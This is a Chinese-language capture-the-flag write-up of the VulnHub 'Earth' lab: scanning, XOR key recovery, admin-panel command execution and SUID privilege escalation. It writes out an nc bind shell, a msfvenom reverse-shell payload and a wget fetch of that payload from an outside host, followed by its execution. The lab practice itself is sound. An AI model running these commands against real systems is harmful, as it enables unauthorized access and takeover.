渗透靶场之VunlnHub - Earth

在VunlnHub 上找到一个比较新的练习环境 The Planets: Earth

https://www.vulnhub.com/entry/the-planets-earth,755/

下载好ova，导入到VMware中。

按照国际惯例，打开Kali使用Nmap 先扫为敬。全端口扫描一遍看看哪些端口对外开放。

nmap -A -sS -T5 -p- -sV 192.168.2.91

结果很不乐观呐，只对外 22，80 ，443 这几个常规端口。

那么对 ssh 端口爆破一波，看看常见的用户存不存在弱密码。

经过几轮尝试无功而返，目前看来不存在弱密码。我们在看看其他端口能不能收集到有用信息。直接访问目标地址192.168.2.91 我勒个去，直接400错误HTTP 和 HTTPS都是400。

竟然是400 那么就说明我们的请求姿势不对，可能请求的时候少了东西。回到nmap结果，可以看到HTTPS使用的证书，以及SAN 记录中的域名。

那我们就直接访问域名试试，在本机Hosts 中加好域名和IP 然后访问域名。

HTTPS 打开是一个测试网页，HTTP 返回了相对有用的信息。

不过这是啥玩意？向地球发送的密文吗？随便试了试规则应该是 Message 内容 和 Message Key 进行某些转换，然后输出结果。现在我们既没有 原文 也 没有密钥，根本无法将之前的密文解密。 需要找找其他页面有没有什么提示。

拿出dirb 对两个网站在扫描一波，看看有什么新的发现。Hmmm.. 真是信息少的可怜。

http://terratest.earth.local/admin/login应该是后台，页面十分简洁。登录不需要验证码，也可以爆破一波，这里我就不展示了，因为我依旧没爆破出密码。感觉这个系统应该不存在弱密码。

翻看 https://terratest.earth.local/robots.txt的时候发现一条有意思的记录，这说明什么？推测应该存在一个testingnotes 但是后缀名未知的网站，那么我们加一些常见的后缀名看看能不能返回有用信息。

Bingo加了一个TXT 直接打开，而且里面的内容相当让人欣喜。里面提到了加密算法使用的是 异或，testdata.txt 是之前测试的文件，terra是登录admin的账户。

很好，我们通过 https://terratest.earth.local/testdata.txt得到了原文，现在有知道了加密算法是异或，那我们就可以这些条件来猜测密钥了。不罗嗦，直接Python写个脚本猜密钥。

x='37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40'

最终密钥为 earthclimatechangebad4humans

使用此密钥解码了其他两个密文，没有任何有用信息这里就不展示了。我们使用这个这个作为密码，结合前面提到的 terra. 成功登录到了admin 网页。好寒酸的后台，不过可以执行命令行。这里我们拿到了第一个 Flag

cat /var/earth_web/user_flag.txt

下一步尝试拿到机器的root权限，查看当前权限，是Apache用户。

看到机器上有NC 可以用，直接尝试NC 创建本地bash监听，然后kali连接。

nc -lvp 4444 -e /bin/bash

不过悲催的是机器有防火墙，远程机器无法连接到目标端口。

那么只能换个思路， Kali负责监听，让目标机主动连接。绝大多数防火墙都是限制入站，不限制出站。

但是在测试时候发现如果直接输入IP地址会提示报错。看来作者也做了一些限制。


我们先看一下当前用户权限对哪些路径可写。

find / -user apache 2>/dev/null

经过查找，有好多路径可写，这里我选择使用 /var/lib/httpd 这个路径。我们试试使用域名会不会拦截。

wget http://www.baidu.com-O /var/lib/httpd/1.html

竟然可以写入，那么就说明它只对IP进行拦截，不会限制域名

直接用metasploit 生成一个反向shell 然后下载到目标机器上执行。

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.2.90 LPORT=4444 -f bash > /tmp/shell1

然后执行wget http://hikali.xyz:8000/shell1 -O /var/lib/httpd/shell ，可以看到shell已经下载好了。

在kali上打开msfconsole 并配置好监听IP 和端口 run起来。

use exploit/multi/handler

set payload linux/x86/meterpreter/reverse_tcp

在目标机赋予文件执行权限然后执行。

chmod a+x /var/lib/httpd/shell

然后执行 ./var/lib/httpd/shell

这样就获得了一个meterpreter shell

切换到shell 模式，看看当前内核，系统版本有没有比较明显的漏洞。不幸的是内核版本较新，安装的软件版本也都很新，不存在什么漏洞。

试了试脏牛、suid、CVE-2021-3156 都没能拿到root权限。，

Privesc 这个地方由于水平问题卡了好久，最终在作者的指点下，专注于 SUID 提权。

再仔细研究一下存在SUID的这些程序

find / -type f -perm -u=s 2>/dev/null | xargs ls -l

这里给大家提供一个技巧，可以使用strings 命令查看每个应用都包含什么字段，然后看看哪些点可以利用。经过一一查看发现reset_root这个程序内有乾坤。里面有描述说当reset_root 满足所有条件时，可以出发重置密码并将密码重置为 Earth。

那么，reset_root 需要满足什么条件呢？我们把reset_root 下载到本地，然后调试分析一下。

在本地使用strace 进行调试，看看执行的时候都加载了哪些东西。Strace -f reset_root

通过图中可以看到程序访问 /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe

时遇到文件无法找到，之后验证失败。

那么解决办法就很明朗了，我们先把这几个文件在目标机器上创建出来，然后在执行。

Bingo， 成功拿到root 权限。在/root 下面成功拿到 root_flag
